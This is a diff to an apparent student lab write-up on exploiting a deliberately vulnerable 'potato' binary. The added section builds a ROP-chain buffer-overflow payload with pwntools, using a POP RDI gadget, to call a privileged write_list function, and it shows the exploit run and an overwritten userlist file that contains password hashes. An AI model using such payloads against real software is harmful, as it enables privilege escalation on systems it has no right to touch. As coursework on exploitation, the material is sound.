@@ -282,6 +282,93 @@ Still a succesful redirect of the execution flow is possible.
 
 **TODO**
 
+Changing the executioin flow to access a function only accessible only to priviledged users is not as straight forward as changing to a simple other function in the program. This is mainly because the functions accessible by priviledged users accept some sort of function argument.
+
+We can choose a function from the ones we can see are behind the `is_priviledged()` check in the code. 
+
+For this excample we choose the `write_list(char* path)` function.
+
+First we need to identify the address of our desired target. This can be done analogous to the way we did it when changing the control flow for the first time. We will find the address of the function is at `0x403778`.
+
+Next we need the string _userlist_ in hex format. This can be either crafted by hand or we can find an existing string containing the word _userlist_ in the potato2s memory space.
+
+For our purpose it is easiest to look for already existing strings in the programs memory space. 
+First we need to identify the memory space we want to search the string in:
+
+```bash
+gef➤  vmmap
+[ Legend:  Code | Stack | Heap ]
+Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000402000 0x0000000000000000 r-- /home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato
+0x0000000000402000 0x0000000000405000 0x0000000000002000 r-x /home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato
+0x0000000000405000 0x0000000000406000 0x0000000000005000 r-- /home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato
+0x0000000000406000 0x0000000000407000 0x0000000000006000 r-- /home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato
+0x0000000000407000 0x0000000000408000 0x0000000000007000 rw- /home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato
+
+[Rest ommmited for better readability]
+```
+
+We can see that the main program memory space stretches from `0x0000000000400000` to `0x0000000000408000`.
+To search this space for the string of _userlist_ we can use the following command:
+
+```bash
+gef➤  find 0x0000000000400000, 0x0000000000408000, "userlist"
+0x4051da
+0x40526e
+2 patterns found.
+```
+
+We can see that two addresses containing the string _userlist_ were found. For the purpose of this exercise either one will suffice so we will use the first one.
+
+To craft a functional payload we will need to pass the argument to the `write_list(char* path)` function when it is called we will need to write the argument to `RDI` at the right time, this is imporant because in 64-Bit systems the first function parameter is most commonly passed via the `RDI` register. For this we will need to use a `ROP Gadget`, later on we will see how to find those gadgets. For now we will just use the gadget available at the following address: `0x155554c34205`.
+
+To ensure that thie payload works the stack needs to be realigned after jumping to the `write_list` function. To realign the stack we simply need to execute a second arbitrary `ret` statement. For this we use the address of the `ret` statement from the `changename` function: `0x4040e4`.
+
+With this information we can craft the following payload:
+
+```python
+payload=b"\x41"*72 + p64(0x4040e4) + p64(POP_RDI) + p64(0x4051da) + p64(0x403778) 
+```
+
+Executing the Python script with the payload does not yield any extra ouput to the terminal.
+
+```bash
+python3 pwn_potato2.py
+[*] '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+    Debuginfo:  Yes
+[+] Starting local process '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato': pid 52120
+[!] ASLR is disabled!
+[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato', '-p', '52120', '-x', '/tmp/pwnlib-gdbscript-nblnvnee.gdb']
+[+] Waiting for debugger: Done
+b'starting up (pid 52120)\nreading file userlist\nhandle_client\ncmd> '
+b'Welcome!\nusername: password: searching for user ...\nchecking password ...\nYou are authorized.\n\ncmd> '
+[*] Switching to interactive mode
+What is the name > Name changed.
+[*] Got EOF while reading in interactive
+$ 
+```
+
+If we look into the `userlist` file we can see that our write was succsessful.
+
+```
+root:2f99191d04198a3f778043dda155ba0f:0:/root:/bin/bash
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@@:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:1094795585:AAAAAAAAAAAA�@@:/usr/bin/rbash
+mario:5e455c58e29cce3c164506ee28f72ccc:10001:/home/mario:/usr/sbin/nologin
+alberto:x:10002:/home/alberto:/usr/bin/rbash
+livero:x:1003:/home/livero:/usr/bin/rbash
+emil:202cb962ac59075b964b07152d234b70:10004:/home/emil:/bin/sh
+```
+
+Currently we are only writing the `A`s we put on the stack to overflow the buffer to the list, with a little more care this could probably be crafted to a payload which would elevate our privileges.
+
 ### Shellcode execution
 
 To execute shellcode the code had to be injected into the buffer which can be overflown and then have the return address point to the beginning address of this buffer. 
@@ -383,8 +470,6 @@ uid=1000(philip) gid=1000(philip) groups=1000(philip),4(adm),24(cdrom),27(sudo),
 We can clearly see that we are no longer bound to the executed program but rather have full shell access with the rights of the user `philip`. 
 
 ### Ret2libc attack
-
-**TODO**
 
 The 'Return to LibC' attack or `ret2libc` for short is a little more complicated to execute on a x64 system than on a x32 system.
 The basic idea of `ret2libc`is to not inject sehllcode into the buffer and execute our buffer but rather find exisiting linked libc functions we can use to spawn our shell. This may be necessary because the stack of our application might not be executable.
@@ -558,8 +643,6 @@ $ $ id -a
 uid=1000(kali) gid=1000(kali) Gruppen=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),116(bluetooth),121(wireshark),123(lpadmin),129(scanner),134(kaboxer)
 $ $  
 ```
-
-**IS THIS EVEN POSSIBLE IN THE x64 EXECUTABLE?**
 
 ### Custom shellcode or ROP chain
 
